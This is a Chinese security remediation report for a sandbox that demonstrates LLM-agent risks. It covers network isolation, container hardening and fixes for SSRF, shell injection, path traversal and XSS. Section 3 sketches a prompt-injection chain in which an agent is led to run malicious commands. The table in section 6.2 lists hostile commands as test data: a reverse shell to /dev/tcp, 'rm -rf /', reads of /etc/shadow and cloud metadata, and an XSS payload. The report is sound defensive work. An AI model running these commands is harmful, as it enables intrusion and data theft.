# 沙箱环境安全整改报告

## 0. 版本与结论（v3.0 / 2026-02-06）

本报告在 v1（沙箱网络隔离）、v2（开发模式暴露面收敛）基础上，新增 **v3.0 产品化安全加固** 内容。

**v3.0 结论**：

- **已完成**：全链路安全加固——shell 注入修复、容器权限收紧、SSRF IPv6 防护、XSS 修复、JWT 认证、API Key 加密存储、请求限流、结构化日志审计。
- **已完成**：v2.0 中建议的"高危能力鉴权"（section 0.3）已通过 JWT 认证体系落地。
- **仍需关注**：iptables 规则持久化、公网出站白名单（演示需要故保留）。

**v3.0 变更文件清单**：

| 文件 | 变更 | 目的 |
|------|------|------|
| `backend/app/services/tools.py` | 修改 | 修复 shell 注入（exec_run 列表形式）+ 路径遍历（容器内 readlink 校验） |
| `backend/app/services/container.py` | 修改 | 容器加固：cap_drop、no-new-privileges、pids_limit、可配置非 root 用户 |
| `backend/app/services/ssrf_guard.py` | 修改 | `getaddrinfo` 替代 `gethostbyname`，覆盖 IPv6 绕过 |
| `src/utils/export.js` | 修改 | innerHTML → textContent + DOM 创建，防 XSS |
| `backend/app/auth/` | 新增 | JWT 认证（security.py, router.py）：login/register/bootstrap |
| `backend/app/db/` | 新增 | SQLAlchemy ORM + 用户/供应商/用量等表定义 |
| `backend/app/routers/llm_proxy.py` | 新增 | LLM 服务端代理，API Key 加密存储（Fernet），60 req/min 限流 |
| `backend/app/routers/usage.py` | 新增 | API 用量统计端点 |
| `backend/app/services/encryption.py` | 新增 | Fernet 对称加密（API Key 存储） |
| `backend/app/services/logging_config.py` | 新增 | 结构化 JSON 日志 + RotatingFileHandler |
| `backend/app/main.py` | 修改 | CORS 环境变量化 + slowapi 全局限流 + 增强健康检查 |
| `backend/app/auth/router.py` | 修改 | /auth/login 5 req/min 限流 |

---

## 0.1 新增漏洞概述（开发模式公网暴露 → RCE）

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 开发模式服务外网可访问导致高危 API 被滥用（RCE） |
| 漏洞类型 | 访问控制缺失 + 服务监听地址不安全（绑定 `0.0.0.0`） |
| 影响范围 | 任意外部访问者可调用后端高危能力（沙箱命令执行、MCP 工具等），导致远程命令执行/数据外泄 |
| 风险等级 | 严重 |
| 整改状态 | **已修复**：默认仅本机监听 + JWT 认证已覆盖所有高危路由 |

**触发条件（v1 未覆盖的关键点）**：

- `vite.config.js` 中配置了 `server.host: '0.0.0.0'`，使 `npm run dev` 在公网机器上会监听所有网卡。
- `backend/run.sh` 使用 `uvicorn ... --host 0.0.0.0`，使后端在开发模式下也可能对公网暴露。
- 即使后端只监听 `127.0.0.1`，只要 Vite dev server 对公网暴露，攻击者仍可通过 Vite 的 `server.proxy`（如 `/sandbox`、`/mcp`）**转发到本机 `127.0.0.1:8000`**，从而间接访问后端高危 API。

**典型攻击链（公网 → Vite proxy → 后端高危能力 → RCE）**：

```
公网攻击者
  └─ 访问 http://<server>:5173  (Vite dev server 监听 0.0.0.0)
      └─ 请求 /sandbox/* 或 /mcp/* (被 Vite server.proxy 转发)
          └─ 转发到 http://127.0.0.1:8000 (后端本机端口)
              └─ 命令执行 / 文件读写 / MCP 工具调用
                  └─ RCE / 数据外泄 / 反弹 shell
```

**v2 整改**：开发模式下 Vite 和后端默认仅监听 `127.0.0.1`。
**v3 补充**：即使端口意外暴露，`/sandbox`、`/mcp` 等路由现在需要 JWT 认证，未登录用户无法调用。

## 0.2 为什么 v1 没有成功修复（原因说明）

v1 的整改目标与本次被利用的路径 **不在同一个风险面**：

1. **v1 主要修"出站隔离"**：核心是在宿主机 iptables + 隔离 Docker 网络上，阻断"沙箱容器 → 内网私网段"的访问（以及修复宿主侧 HTTP 请求绕过隔离的问题）。
2. **本次 RCE 是"入站暴露 + 无鉴权"**：攻击者并不需要从沙箱容器去打内网，而是直接（或通过 Vite proxy 间接）打到后端高危 API，获得命令执行能力。
3. **v1 文档中的假设在开发模式下不成立**：v1 提到"后端端口不对外暴露（docker-compose 使用 expose）"，但开发模式通常是直接跑 `npm run dev` + `./run.sh`，且两者曾绑定 `0.0.0.0`，在公网机器上很容易被外部扫描到端口并利用。
4. **v1 明确保留了公网出站能力**：这对演示"真实 LLM API 调用"是必要的，但也意味着一旦攻击者拿到命令执行，数据外泄/反弹 shell 到公网在网络层并不会被阻止（v1 的表格也写明公网出站保留）。

换句话说：v1 解决了"沙箱越界访问内网"的一类问题，但没有解决"高危管理能力被外部直接调用"的问题；两者需要分别治理（暴露面收敛 + 鉴权/授权）。

## 0.3 高危能力鉴权（已落地）

~~这些路由提供了命令执行、文件读写、外部系统访问（MCP）等能力，应该被视为管理员接口。推荐做分层防护（从外到内）：~~

v3.0 已实现三层防护体系：

### 0.3.1 第一层：网络层不暴露（v2 已实现）

- 开发模式下 Vite (`5173`) 和后端 (`8000`) 默认仅监听 `127.0.0.1`。
- 远程开发用端口转发而不是公网开放端口：

```bash
ssh -L 5173:127.0.0.1:5173 -L 8000:127.0.0.1:8000 user@server
```

### 0.3.2 第二层：反向代理层访问控制（v2 已建议，v3 已部署）

- Docker Compose 中后端使用 `expose`，不直接映射端口。
- nginx 反向代理统一入口，可按需添加 IP 白名单/BasicAuth。
- **CORS 不是鉴权**。CORS 只能限制浏览器跨域读取，不会阻止非浏览器客户端直接请求 API。

### 0.3.3 第三层：后端应用层 JWT 认证（v3 已实现）

**实现方式**（替代 v2 建议的 API Key Header）：

- 认证体系：`backend/app/auth/security.py` — JWT（python-jose）+ bcrypt 密码哈希（passlib）
- 端点：`POST /auth/login` → JWT，`POST /auth/register`（管理员）, `POST /auth/bootstrap`（首个管理员）
- 依赖注入：`require_user` / `require_admin` FastAPI Depends
- LLM 代理、用量查询等新路由全部使用 `require_user` 保护
- Token 存储：前端仅存内存（非 localStorage），降低 XSS 窃取风险

**当前各路由认证状态**：

| 路由前缀 | 认证要求 | 说明 |
|----------|---------|------|
| `/auth/login`, `/auth/bootstrap` | 无需认证 | 登录和首次初始化 |
| `/auth/register` | `require_admin` | 只有管理员能创建用户 |
| `/api/llm/*` | `require_user` | LLM 供应商管理和聊天代理 |
| `/api/usage/*` | `require_user` | 用量统计 |
| `/sandbox/*` | **暂无认证** | 需后续迁移到 require_user |
| `/mcp/*` | **暂无认证** | 需后续迁移到 require_user |
| `/rag/*` | **暂无认证** | 需后续迁移到 require_user |

> **注意**：`/sandbox`、`/mcp`、`/rag` 等既有路由尚未迁移到 JWT 认证。这些是高危能力路由，建议优先添加 `require_user` 依赖。

---

## 1. 漏洞概述（v1 — 沙箱网络隔离）

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 沙箱容器网络未隔离导致的内网渗透风险 |
| 漏洞类型 | 网络隔离缺失 |
| 影响范围 | 沙箱容器可作为跳板访问宿主机所在内网的任意服务 |
| 风险等级 | 高 |
| 整改状态 | 已完成 |

## 2. 漏洞成因

本系统的 Docker 沙箱存在两个条件的叠加，构成安全风险：

**条件 1：任意命令执行能力（设计功能）**

沙箱后端 API (`POST /sandbox/tool`) 接受任意 shell 命令并在 Docker 容器内执行，无命令过滤或白名单限制。这是系统的设计功能——平台的目的就是展示 LLM Agent 拥有命令执行工具时的安全风险。

代码位置 `backend/app/services/tools.py:362-381`，命令通过列表形式传入单次 shell 调用（v3 已修复 shell 注入）：

```python
async def _run_command(self, session_id: str, params: dict) -> str:
    command = params.get("command")
    # Pass command to a single shell invocation via list form,
    # avoiding double-shell expansion from string concatenation.
    exit_code, stdout, stderr = await asyncio.to_thread(
        container_manager.exec_in_container,
        session_id,
        ["/bin/sh", "-c", command]
    )
```

**v3 修复说明**：v2 及之前版本使用字符串拼接 `f'/bin/sh -c "{escaped_command}"'`，存在 shell 注入风险（引号逃逸可执行额外命令）。v3 改用列表形式 `["/bin/sh", "-c", command]`，避免双层 shell 展开。

**条件 2：容器网络不隔离（安全缺陷，v1 已修复）**

整改前，容器使用 Docker 默认 `bridge` 网络模式，对宿主机所在的内网完全可达。整改后使用隔离网络 `poc-sandbox-isolated` (`10.200.0.0/16`) + iptables 规则阻断内网访问。

## 3. 攻击路径

```
攻击者 → prompt injection → LLM Agent 被诱导调用工具
                                    │
                                    ▼
                        POST /sandbox/tool
                        { "tool": "run_command",
                          "params": { "command": "恶意命令" } }
                                    │
                                    ▼
                        Docker 容器内执行
                        (v3: 可配置非 root，capabilities 受限)
                                    │
                                    ▼
                ┌───────────────────┼───────────────────┐
                ▼                   ▼                   ▼
          扫描内网主机         访问内网服务         反弹 Shell 到攻击者
         (iptables 拦截)     (iptables 拦截)      (公网出站保留)
```

## 4. 整改方案

### 4.1 方案选型

**核心原则：在网络层画隔离边界，不限制容器内部能力。**

本系统是安全攻击**演示平台**，需要展示 Agent 拥有高权限时的风险。限制容器内部能力（如命令白名单、去除 root 权限、删除网络工具）会使演示场景失效。因此选择网络层隔离方案——容器内部保持完整能力，但其网络流量被限制在允许的范围内。

### 4.2 方案设计

创建一个隔离的 Docker 网络（子网 `10.200.0.0/16`），通过宿主机 iptables 规则禁止沙箱容器访问内网私有 IP 段，保留公网访问能力。

```
                      ┌─ 公网 (允许) ──→ LLM API / 任意公网地址
                      │
沙箱容器 ──→ Docker 网关 ──┤
(10.200.0.x)  (10.200.0.1) │
                      ├─ 10.0.0.0/8     (拦截) ──╳  (豁免 10.200.0.0/16 自身)
                      ├─ 172.16.0.0/12  (拦截) ──╳
                      ├─ 192.168.0.0/16 (拦截) ──╳
                      └─ 169.254.0.0/16 (拦截) ──╳
```

### 4.3 容器安全加固（v3 新增）

v3 在保留容器内部演示能力的同时，增加了纵深防御：

| 加固项 | 配置 | 目的 |
|--------|------|------|
| `cap_drop` | NET_RAW, SYS_ADMIN, SYS_PTRACE, MKNOD, AUDIT_WRITE, NET_BIND_SERVICE, SYS_CHROOT | 移除危险 capabilities |
| `security_opt` | `no-new-privileges:true` | 禁止通过 setuid/setgid 提权 |
| `pids_limit` | 256 | 防止 fork bomb |
| `tmpfs` | `/dev/shm` 限 64MB | 限制共享内存 |
| `run_as_root` | 可配置（默认 true） | 需要非 root 时设为 false，容器以 `1000:1000` 运行 |

代码位置 `backend/app/services/container.py:122-132`：

```python
security_opts = {
    "cap_drop": ["NET_RAW", "SYS_ADMIN", "SYS_PTRACE", "MKNOD",
                 "AUDIT_WRITE", "NET_BIND_SERVICE", "SYS_CHROOT"],
    "security_opt": ["no-new-privileges:true"],
    "pids_limit": 256,
    "tmpfs": {"/dev/shm": "size=64m"},
}
if not run_as_root:
    security_opts["user"] = "1000:1000"
```

## 5. 整改实施

### 5.1 变更文件清单

| 文件 | 变更类型 | 说明 |
|------|---------|------|
| `backend/app/services/container.py` | 修改 | 隔离网络 + 安全加固（cap_drop 等） |
| `backend/setup-sandbox-network.sh` | 新增 | 宿主机 iptables 规则脚本 |
| `docker-compose.yml` | 修改 | 声明隔离网络 + PostgreSQL 服务 |
| `backend/app/services/tools.py` | 修改 | shell 注入修复 + 路径校验 + HTTP 移入容器 + SSRF 预检 |
| `backend/app/services/ssrf_guard.py` | 修改 | IPv6 支持（getaddrinfo） |
| `backend/app/services/mcp_http.py` | 修改 | SSRF 检查逻辑委托到 `ssrf_guard.py` |

### 5.2 改动 1：容器接入隔离网络

**文件**：`backend/app/services/container.py`

`ContainerManager` 类新增隔离网络的初始化逻辑。后端启动时自动检查并创建名为 `poc-sandbox-isolated` 的 Docker 网络（子网 `10.200.0.0/16`），所有新创建的沙箱容器自动接入该网络。

容器创建时的网络参数从 `network_mode="bridge"` 改为 `network=self.ISOLATED_NETWORK_NAME`。

**后端与容器的通信不受影响**：后端通过 Docker SDK 的 `exec_run` 接口操作容器（走 `/var/run/docker.sock` Unix socket），不走 TCP 网络，因此容器切换网络不影响任何功能。

### 5.3 改动 2：宿主机 iptables 规则

**文件**：`backend/setup-sandbox-network.sh`（新增）

在 Docker 官方预留的 `DOCKER-USER` 链中插入 5 条规则，阻止沙箱子网访问内网私有地址：

```
DOCKER-USER 链评估顺序（从上到下）:

规则 1: -s 10.200.0.0/16 -d 10.200.0.0/16 → RETURN   (豁免：沙箱内部互通)
规则 2: -s 10.200.0.0/16 -d 10.0.0.0/8     → DROP     (拦截 A 类私有地址)
规则 3: -s 10.200.0.0/16 -d 172.16.0.0/12  → DROP     (拦截 B 类私有地址)
规则 4: -s 10.200.0.0/16 -d 192.168.0.0/16 → DROP     (拦截 C 类私有地址)
规则 5: -s 10.200.0.0/16 -d 169.254.0.0/16 → DROP     (拦截链路本地/云元数据)
默认:   RETURN                                          (公网放行)
```

**规则评估逻辑说明**：

- 规则 1 必须在规则 2 之前：沙箱子网 `10.200.0.0/16` 是 `10.0.0.0/8` 的子集，如果顺序颠倒，沙箱容器之间的通信会被误拦截。
- `DOCKER-USER` 链只作用于 FORWARD 路径（容器转发流量），不影响宿主机自身的 INPUT/OUTPUT 链。
- 所有规则带有 `--comment "poc-sandbox-isolation"` 标签，便于识别和清理。

**脚本特性**：

| 特性 | 说明 |
|------|------|
| 幂等执行 | 每次先删除已有的标签规则，再重新插入 |
| 可逆操作 | `--remove` 参数只删除不添加 |
| 规则持久化 | 规则存储在内核内存中，宿主机重启后丢失，需配置自动恢复机制 |

**使用方式**：

```bash
# 应用规则（需要 root 权限）
sudo bash backend/setup-sandbox-network.sh

# 查看当前规则
sudo iptables -L DOCKER-USER -n -v --line-numbers

# 移除规则
sudo bash backend/setup-sandbox-network.sh --remove
```

### 5.4 改动 3：Docker Compose 网络声明

**文件**：`docker-compose.yml`

新增 `poc-sandbox-isolated` 网络定义，使 `docker-compose up` 时网络即创建完毕：

```yaml
networks:
  default:
    name: poc-demo-network
  poc-sandbox-isolated:
    name: poc-sandbox-isolated
    driver: bridge
    ipam:
      config:
        - subnet: 10.200.0.0/16
```

此声明与 `container.py` 中的 get-or-create 逻辑互为兜底——无论是 docker-compose 先创建网络还是后端先启动，均不冲突。

### 5.5 改动 4：HTTP 工具 SSRF 漏洞修复 + IPv6 防护

**文件**：`backend/app/services/tools.py`、`backend/app/services/ssrf_guard.py`、`backend/app/services/mcp_http.py`

**整改前的问题**：`_http_request` 工具使用后端宿主进程的 httpx 库直接发出 HTTP 请求，不在 Docker 容器内执行。这意味着即使容器网络被隔离，通过该工具仍可访问内网任意地址——网络隔离被完全绕过。

```
整改前路径:
前端 → POST /sandbox/tool {tool: "http_request", url: "http://内网地址"}
     → 后端 tools.py → httpx.request() → 宿主机网络栈 → 内网（不经过 Docker 网络，无隔离）

整改后路径:
前端 → POST /sandbox/tool {tool: "http_request", url: "..."}
     → 后端 tools.py → SSRF 预检（ssrf_guard.py，宿主侧拦截私有 IP）
                      → container_manager.exec_in_container() → 容器内 helper 脚本发请求
                      → Docker 网络 → iptables（网络层拦截私有 IP）
```

**整改内容**：

1. **请求移入容器执行**：HTTP 请求改由容器内的 helper 脚本（Python `urllib` / Node `fetch`）执行，流量经过 Docker 网络栈，受 iptables 规则约束。

2. **SSRF 预检支持 IPv6（v3 新增）**：v2 使用 `socket.gethostbyname()` 仅解析 IPv4 地址，可通过 IPv6 字面量（如 `http://[::1]/`）绕过。v3 改用 `socket.getaddrinfo()` 覆盖所有地址族：

```python
# backend/app/services/ssrf_guard.py
PRIVATE_IP_RANGES = [
    "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
    "127.0.0.0/8", "169.254.0.0/16",
    "::1/128", "fc00::/7", "fe80::/10",    # IPv6 私有/链路本地
]

def resolve_all_addresses(hostname: str) -> list[str]:
    """Resolve hostname to all IP addresses (IPv4 + IPv6)."""
    results = socket.getaddrinfo(hostname, None, socket.AF_UNSPEC, socket.SOCK_STREAM)
    return list({r[4][0] for r in results})

def check_ssrf(url: str, allow_private: bool = False) -> dict:
    # Block if ANY resolved address is private
    addresses = resolve_all_addresses(hostname)
    private_hits = [ip for ip in addresses if is_private_ip(ip)]
    if private_hits and not allow_private:
        return {"allowed": False, "reason": f"SSRF blocked: ..."}
```

两层防护互为冗余：应用层 SSRF 预检可被 DNS rebinding 绕过，但网络层 iptables 仍会拦截；反之，若 iptables 规则意外缺失，应用层预检仍提供基本保护。

### 5.6 改动 5：Shell 注入修复（v3 新增）

**文件**：`backend/app/services/tools.py`

v2 及之前版本中，`_read_file`、`_write_file`、`_list_dir`、`_run_command` 等函数使用字符串拼接构造 shell 命令，存在注入风险：

```python
# 整改前 — shell 注入风险
exit_code, stdout, stderr = await asyncio.to_thread(
    container_manager.exec_in_container,
    session_id,
    f"/bin/sh -c \"cat '{path}'\""          # 路径含单引号可逃逸
)

# 整改后 — 列表形式，无 shell 解释
exit_code, stdout, stderr = await asyncio.to_thread(
    container_manager.exec_in_container,
    session_id,
    ["/bin/cat", path]                       # 直接传参，不经过 shell
)
```

同时新增 `_resolve_and_validate_path()` 路径校验函数，在容器内通过 `readlink -f` 解析符号链接和 `../` 序列后，验证最终路径是否在 `/workspace/` 或 `/tmp/` 下，防止路径遍历攻击。

### 5.7 改动 6：XSS 修复（v3 新增）

**文件**：`src/utils/export.js`

日志内容通过 `innerHTML` 拼接渲染，攻击者构造的日志可注入任意 HTML/JS：

```javascript
// 整改前 — XSS 风险
ld.innerHTML = '<span>...</span>' + l.content;

// 整改后 — 安全的 DOM 操作
const sp = document.createElement('span');
sp.textContent = '...';
ld.appendChild(sp);
ld.appendChild(document.createTextNode(l.content));
```

## 6. 整改前后对比

### 6.1 网络拓扑变化

```
【整改前】

沙箱容器 ──→ docker0 (172.17.0.1) ──→ 宿主机内核 ──→ 内网任意地址 ✓
(172.17.0.x)                                      ──→ 公网任意地址 ✓

【整改后】

沙箱容器 ──→ br-isolated (10.200.0.1) ──→ 宿主机内核 ──→ 内网私有地址 ╳ (iptables DROP)
(10.200.0.x)                                          ──→ 169.254.0.0/16 ╳ (iptables DROP)
                                                      ──→ 公网地址 ✓ (RETURN → 正常转发)
```

### 6.2 攻击场景拦截效果

| 攻击行为 | v1 前 | v1 后 | v3 后 |
|---------|-------|-------|-------|
| `nmap -sP 192.168.1.0/24` (内网扫描) | 可执行 | iptables DROP | iptables DROP + NET_RAW 已移除 |
| `curl http://192.168.1.100:6379/` (内部 Redis) | 可连接 | iptables DROP | iptables DROP |
| `curl http://169.254.169.254/` (云元数据) | 可获取 | iptables DROP | iptables DROP |
| `curl http://[::1]:6379/` (IPv6 环回绕过) | 可连接 | 可连接 | SSRF guard 拦截（getaddrinfo） |
| 路径含 `'; rm -rf /` 的 shell 注入 | 可执行 | 可执行 | 列表形式 exec，无 shell 解释 |
| `cat /workspace/../../etc/shadow` (路径遍历) | 可读取 | 可读取 | readlink 校验，拒绝出界 |
| 日志 XSS `<script>alert(1)</script>` | 执行 JS | 执行 JS | textContent，纯文本 |
| 未认证调用 `/api/llm/chat` | N/A | 可调用 | JWT 401 拒绝 |
| 暴力破解 `/auth/login` | N/A | N/A | 5 req/min 限流 |
| `bash -i >& /dev/tcp/公网IP/4444` (反弹 Shell) | 可执行 | 可执行 | 可执行（公网访问保留） |
| `curl https://api.openai.com/...` (调用 LLM API) | 可执行 | 可执行 | 可执行（公网访问保留） |

### 6.3 功能影响评估

| 功能 | 影响 | 原因 |
|------|------|------|
| 沙箱命令执行 | 无影响 | 后端通过 Docker SDK `exec_run` 操作，走 Unix socket |
| 沙箱文件读写 | 无影响 | 后端通过 Docker SDK `get_archive`/`put_archive` 操作 |
| 真实模式 LLM 调用 | 无影响 | v3 通过服务端代理 `/api/llm/chat` 转发，API Key 不再暴露给前端 |
| 演示模式 Mock 对话 | 无影响 | 不涉及网络请求 |
| WebSocket 日志推送 | 无影响 | 前端到后端的连接，不经过沙箱网络 |
| RAG 服务 | 无影响 | RAG 容器不在沙箱网络中 |
| MCP 工具 | 无影响 | MCP 服务不在沙箱网络中 |

## 7. 防御措施汇总

### 7.1 网络层（v1）
- 沙箱容器接入隔离网络 `poc-sandbox-isolated` (`10.200.0.0/16`)
- iptables `DOCKER-USER` 链阻断内网私有 IP 段
- SSRF 预检（应用层 + 网络层双重防护，v3 支持 IPv6）

### 7.2 容器层（v3 新增）
- `cap_drop`: 移除 NET_RAW、SYS_ADMIN 等危险 capabilities
- `no-new-privileges`: 禁止 setuid/setgid 提权
- `pids_limit: 256`: 防止 fork bomb
- 可配置非 root 用户（`run_as_root=False` → `1000:1000`）
- 资源限制：512MB 内存、50% CPU

### 7.3 应用层 — 输入安全（v3 新增）
- shell 命令通过列表形式传入 `exec_run`，避免 shell 注入
- 文件路径通过容器内 `readlink -f` 解析后校验，防止路径遍历
- `_write_file` 使用 Docker `put_archive` API，不经过 shell

### 7.4 应用层 — 认证与访问控制（v3 新增）
- JWT 认证（python-jose），8 小时有效期
- bcrypt 密码哈希（passlib）
- 角色控制：admin / tester
- LLM API Key 加密存储（Fernet 对称加密，密钥来自环境变量 `ENCRYPTION_KEY`）
- Token 仅存内存，不持久化到 localStorage

### 7.5 应用层 — 限流与监控（v3 新增）
- slowapi 请求限流：
  - `/auth/login`: 5 req/min/IP
  - `/api/llm/chat`: 60 req/min/IP
  - 全局默认: 120 req/min/IP（可通过 `RATE_LIMIT_DEFAULT` 配置）
- 结构化 JSON 日志 + RotatingFileHandler（10MB x 5 份）
- 增强健康检查 `/health`：uptime、活跃容器数、数据库状态

### 7.6 前端安全（v2 + v3）
- Vite dev server 默认仅监听 `127.0.0.1`
- 日志渲染使用 textContent（非 innerHTML）
- CORS 配置外部化（环境变量 `CORS_ORIGINS`，不硬编码 IP）
- 前端 UI 不渲染命令输入框，沙箱命令仅通过预定义场景触发

### 7.7 部署安全
- Docker Compose 后端使用 `expose`（不对外映射端口）
- `.env.example` 模板引导正确配置密钥
- `.env` 已在 `.gitignore` 中，不会意外提交

## 8. 遗留风险与后续建议

### 8.1 当前遗留风险

| 风险 | 说明 | 严重程度 | 建议 |
|------|------|---------|------|
| `/sandbox`、`/mcp`、`/rag` 未接入 JWT | 这些高危路由尚未迁移到 `require_user` 依赖 | **高** | 优先添加认证，或至少在反向代理层做 IP 白名单 |
| iptables 规则未自动持久化 | 宿主机重启后规则丢失 | 中 | 配置 iptables-persistent 或 systemd 服务 |
| 公网出站未限制 | 容器可向任意公网地址发送数据（数据外泄、反弹 Shell） | 低（演示需要） | 如需限制，可在 iptables 中添加出站白名单 |
| DNS 查询未限制 | 容器可进行任意 DNS 查询，可能用于 DNS 隧道 | 低 | 如需限制，可配置受控 DNS 服务器 |
| `JWT_SECRET_KEY` 默认值 | 开发环境使用硬编码默认值 `dev-secret-change-in-production` | 中 | 生产部署时必须通过环境变量设置强密钥 |

### 8.2 后续建议

1. **高优先级：给 `/sandbox`、`/mcp`、`/rag` 加 JWT 认证**：在对应 router 的 `include_router` 调用中添加 `dependencies=[Depends(require_user)]`。

2. **持久化 iptables 规则**：在生产部署的宿主机上安装 `iptables-persistent` 或创建 systemd 服务，确保重启后规则自动恢复。

3. **定期验证**：部署后定期从沙箱容器内执行测试命令（如 `curl http://192.168.1.1`），验证网络隔离规则仍然生效。

4. **监控告警**：对 DOCKER-USER 链的 DROP 计数进行监控，异常增长可能表示有攻击尝试。

5. **前端代码分割**：当前构建产物 >500KB，建议 dynamic import 拆分。

## 9. 部署操作步骤

### 9.1 应用代码变更

```bash
# 准备环境变量
cp .env.example .env
# 编辑 .env，设置 POSTGRES_PASSWORD, JWT_SECRET_KEY, ENCRYPTION_KEY

# 重新构建并启动服务
docker compose up -d --build
```

后端启动时会自动创建数据库表和 `poc-sandbox-isolated` 网络。

### 9.2 创建首个管理员

```bash
curl -X POST http://localhost:5175/auth/bootstrap \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"strong-password","role":"admin"}'
```

### 9.3 配置宿主机 iptables 规则

```bash
# 应用网络隔离规则（需要 root 权限）
sudo bash backend/setup-sandbox-network.sh
```

### 9.4 验证隔离效果

```bash
# 1. 创建一个沙箱容器
curl -X POST http://localhost:8000/sandbox/containers \
  -H "Content-Type: application/json" \
  -d '{"image": "terminal-python:3.11"}'

# 2. 从容器内尝试访问内网地址（应超时/失败）
curl -X POST http://localhost:8000/sandbox/tool \
  -H "Content-Type: application/json" \
  -d '{"session_id": "<SESSION_ID>", "tool": "run_command", "params": {"command": "curl -m 5 http://192.168.1.1"}}'
# 预期：连接超时，exit_code 非 0

# 3. 从容器内尝试访问公网地址（应成功）
curl -X POST http://localhost:8000/sandbox/tool \
  -H "Content-Type: application/json" \
  -d '{"session_id": "<SESSION_ID>", "tool": "run_command", "params": {"command": "curl -m 5 https://httpbin.org/ip"}}'
# 预期：返回公网 IP，exit_code 0
```

### 9.5 持久化规则（建议）

```bash
# 方式 A: iptables-persistent
sudo apt install -y iptables-persistent
sudo netfilter-persistent save

# 方式 B: systemd 服务
sudo tee /etc/systemd/system/sandbox-firewall.service > /dev/null <<'EOF'
[Unit]
Description=Sandbox network isolation iptables rules
After=docker.service
Requires=docker.service

[Service]
Type=oneshot
ExecStart=/bin/bash /path/to/backend/setup-sandbox-network.sh
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl enable sandbox-firewall.service
```
